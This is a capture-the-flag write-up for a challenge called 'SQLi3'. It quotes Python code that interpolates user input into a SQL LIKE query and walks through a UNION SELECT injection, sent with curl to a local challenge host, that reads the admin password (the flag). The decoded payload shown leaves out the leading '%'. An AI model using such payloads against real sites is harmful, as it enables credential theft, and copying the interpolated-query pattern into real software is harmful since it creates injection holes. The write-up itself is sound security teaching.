# SQLi3

## Challenge Description

### Overview

We are given a web service where users can input a username to query from a database. The query is built using string interpolation, resulting in a classic SQL injection vulnerability.

The goal is to extract the flag, which is stored as the password for the admin user.

## Source Code Analysis

```Python
sql = f'SELECT username FROM users WHERE username LIKE "{query}"'

Database Initialization
db.execute(f"""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])
db.execute(f"""INSERT INTO users SELECT "guest" as username, "password" as password""")
```

This creates two users:

admin with a password from `/flag`

guest with password `"password"`

## Vulnerability

The following line is vulnerable:

```python
sql = f'SELECT username FROM users WHERE username LIKE "{query}"'
```

User input is directly embedded into the SQL string without sanitization, allowing for SQL injection.

## Exploitation

### Objective

We want to turn the query into something like:

```SQL
SELECT username FROM users WHERE username LIKE "%" UNION SELECT password FROM users WHERE username='admin'--"
```

This would return the password of the admin user in the query result.

### Exploitation Steps

Step 1: Encode the payload

The injection payload, URL-encoded:

```SHELL
%25%22%20UNION%20SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27--
```

It decodes to:

```SQL
" UNION SELECT password FROM users WHERE username='admin'--"
```

Step 2: Run the curl command

```SHELL
curl "http://challenge.localhost:80/?query=%25%22%20UNION%20SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27--"
```

## Outcome

This results in:

Retrieving all usernames (`LIKE "%"`)

Plus the admin's password via a `UNION SELECT`

The page then displays the admin password (i.e., the flag)